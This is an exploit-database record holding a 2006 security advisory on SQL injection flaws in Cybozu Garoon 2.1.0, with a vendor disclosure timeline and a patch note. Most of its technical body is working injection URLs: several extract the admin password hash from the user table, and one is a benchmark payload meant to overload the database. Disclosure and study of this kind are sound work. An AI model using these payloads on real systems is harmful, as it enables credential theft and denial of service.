{
  "id": "2267",
  "title": "Cybuzu Garoon 2.1.0 - Multiple SQL Injections",
  "cve": "CVE-2006-4444",
  "vuln_type": "sqli",
  "code": "Cybozu Garoon 2 SQL Injection Vulnerabilities\r\n\r\nby Tan Chew Keong\r\nRelease Date: 2006-08-28\r\n\r\nSummary\r\n\r\nSome SQL injection vulnerabilities have been found in Cybozu Garoon 2. When exploited by a logon user, \r\nthe vulnerabilities allow manipulation of SQL statements which can lead to disclosure of information \r\nfrom the database, or to cause the backend MySQL database to consume large amount of CPU resources.\r\n\r\nTested Versions\r\n\r\nCybuzu Garoon 2 Version 2.1.0 for Windows\r\n\r\nDetails\r\n\r\nThis advisory discloses several SQL injection vulnerabilities in Cybozu Garoon 2.\r\n1) TODO List View/Modify SQL Injection Cybuzu Garoon 2 does not properly sanitise the \"tid\" parameter \r\nin the TODO List View and Modify functionality. It is possible for a logon user to exploit this vulnerability \r\nto select values from arbitrary tables in the database.  \r\n\r\nWhen logon as a normal user:\r\nTESTING NOTE a - In order for the examples to work, you must first logon as a user, then click on the TODO List link (icon) to go to the TODO List index page, before using the exploit.\r\nTESTING NOTE b - Example 2 requires that at least 1 TODO List category has been created (category value 1).\r\n\r\n\r\nExample 1:\r\n\r\nTo retrieve the admin user's password hash via TODO List View.\r\n\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/todo/view?tid=9999999)+union+select+1,null,col_foreign_key,col_password,2,null,0,null,null,null,null+from+tab_cb_user+where+_id=1/*&cid=\r\n\r\nExample 2:\r\n\r\nTo retrieve the admin user's password hash via TODO List Modify.\r\n\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/todo/modify?tid=9999999)+union+select+1,null,col_foreign_key,col_password,1,null,0,null,null,null,null+from+tab_cb_user+where+_id=1/*&cid=\r\n\r\n\r\n2) Workflow View/Print SQL Injection\r\n\r\nCybuzu Garoon 2 does not properly sanitise the \"pid\" parameter in the Workflow View and Print functionality. \r\nIt is possible for a logon user to exploit this vulnerability to select values from arbitrary tables in the database.\r\n\r\nExample 1:\r\n\r\nTo retrieve the admin user's password hash via Workflow View.\r\n\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/workflow/view?fid=9&pid=8888888+union+select+1,2,3,4,5,6,7,8,9,10,11,12,col_foreign_key,14,col_password,16,17,18,19,20,21,22+from+tab_cb_user where _id=1/*\r\n\r\nExample 2:\r\n\r\nTo retrieve the admin user's password hash via Workflow Print.\r\n\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/workflow/print?fid=9&pid=7777777+union+select+col_password,2,3,4,col_foreign_key,6,7,8,9,10,11,12,13,14,15,16,17,18+from+tab_cb_user where _id=1/*\r\n\r\nNote: In order for example 2 to work, \"fid\" must be a valid folder ID.\r\n\r\n3) Other SQL Injection Vulnerabilities\r\n\r\nSeveral other SQL injection vulnerabilities exists. These may e.g. be exploited to cause the MySQL-based Cybozu Database Engine to consume large amount of CPU resources, potentially causing a DoS.\r\n\r\nSQL Injection:\r\n\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid=[SQL]\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/todo/delete?tid=[SQL]\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/schedule/user_view?uid=1[SQL]\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/add?gid=1&uid=1[SQL]\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/history?gid=1&uid=1[SQL]\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/memo/view?iid=1[SQL]&did=\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/memo/print?iid=1[SQL]&did=\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1[SQL]\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1&uid=1[SQL]\r\n\r\nTest Samples:\r\n\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid='\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/todo/delete?tid='\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/schedule/user_view?uid=1'\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/add?gid=1&uid=1'\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/history?gid=1&uid=1'\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/memo/view?iid=1'&did=\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/memo/print?iid=1'&did=\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1'\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1&uid=1'\r\n\r\nExample Exploit Against MySQL Backend:\r\n\r\nhttp://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid=9999999)+ORDER+BY+_id,rand(benchmark(1000000000000,sha1(123456781234567812345678)))/*\r\n\r\nPatch / Workaround\r\n\r\nUpdate to version 2.1.1.\r\n\r\nReferences\r\n\r\nhttp://cybozu.co.jp/products/dl/notice_060825/\r\n\r\nDisclosure Timeline\r\n\r\n2006-07-04 - Vulnerability Discovered.\r\n2006-07-13 - Initial Vendor Notification.\r\n2006-07-13 - Initial Vendor Reply.\r\n2006-07-14 - Received scheduled patch release date from vendor.\r\n2006-08-16 - Received notification that patch release will be delayed.\r\n2006-08-25 - Vendor released patch information on website.\r\n2006-08-28 - Public Disclosure.\r\n\r\nContact\r\nFor further enquries, comments, suggestions or bug reports, simply email them to \r\nTan Chew Keong (chewkeong[at]vuln[dot]sg)\r\n\r\n# milw0rm.com [2006-08-28]",
  "url": "https://www.exploit-db.com/exploits/2267"
}